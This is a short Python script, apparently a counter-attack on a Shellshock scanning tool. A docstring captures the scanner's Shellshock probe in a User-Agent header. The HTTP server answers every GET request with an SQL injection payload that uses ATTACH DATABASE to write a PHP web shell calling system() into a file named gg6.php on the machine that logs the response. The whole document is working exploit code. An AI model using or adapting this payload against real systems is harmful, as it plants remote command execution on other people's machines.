#!/usr/bin/python

import random
import http.server
import socketserver

"""
$ nc -l 5569
GET / HTTP/1.1
User-Agent: () { :;}; echo 'ShellShockTester_atdog';
Host: 140.113.235.151:5569
Accept: */*
"""


PORT = 5566 + random.randint(1, 20)


class MyHandler(http.server.SimpleHTTPRequestHandler):

    def __init__(self,req,client_addr,server):
        http.server.SimpleHTTPRequestHandler.__init__(self,req,client_addr,server)

    def do_GET(self):
        r="ShellShockTester_atdog') ;ATTACH DATABASE './gg6.php' AS pwn;CREATE TABLE pwn.exp(dataz text);INSERT INTO pwn.exp(dataz) VALUES('<?php $o=system(\"ls\"); echo $o;?>');-- "
        self.send_response(200)
        self.send_header("Content-length", len(r))
        self.end_headers()
        self.wfile.write(r.encode())
        self.wfile.flush()
        print(r)

#Handler = http.server.SimpleHTTPRequestHandler

httpd = socketserver.TCPServer(("", PORT), MyHandler)

print("serving at port", PORT)
httpd.serve_forever()
